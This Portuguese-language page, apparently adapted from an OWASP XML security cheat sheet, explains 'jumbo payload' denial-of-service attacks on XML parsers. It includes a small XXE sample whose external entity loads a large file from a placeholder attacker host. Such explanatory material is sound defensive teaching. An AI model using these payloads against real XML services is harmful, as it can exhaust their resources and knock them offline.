---
title: Jumbo Payloads
---

Existem dois métodos principais para tornar um documento maior do que o normal:

- Ataque profundo: usando um grande número de elementos, nomes de elementos e / ou valores de elementos.

- Ataque de largura: usando um grande número de atributos, nomes de atributos e / ou valores de atributos.

Na maioria dos casos, o resultado geral será um grande documento. Este é um pequeno exemplo de como é:

```xml
<SOAPENV:ENVELOPE XMLNS:SOAPENV="HTTP://SCHEMAS.XMLSOAP.ORG/SOAP/ENVELOPE/"
                  XMLNS:EXT="HTTP://COM/IBM/WAS/WSSAMPLE/SEI/ECHO/B2B/EXTERNAL">
 <SOAPENV:HEADER LARGENAME1="LARGEVALUE"
                 LARGENAME2="LARGEVALUE2"
                 LARGENAME3="LARGEVALUE3" …>

 ...
```

### Cargas Jumbo "pequenas"

O exemplo a seguir é um documento muito pequeno, mas os resultados do processamento podem ser semelhantes aos do processamento de cargas úteis jumbo tradicionais. O objetivo de uma carga útil tão pequena é permitir que um invasor envie muitos documentos rápido o suficiente para fazer o aplicativo consumir a maior parte ou todos os recursos disponíveis:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
 <!ENTITY file SYSTEM "http://attacker/huge.xml" >
]>
<root>&file;</root>

```

## Referência externa

- [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html)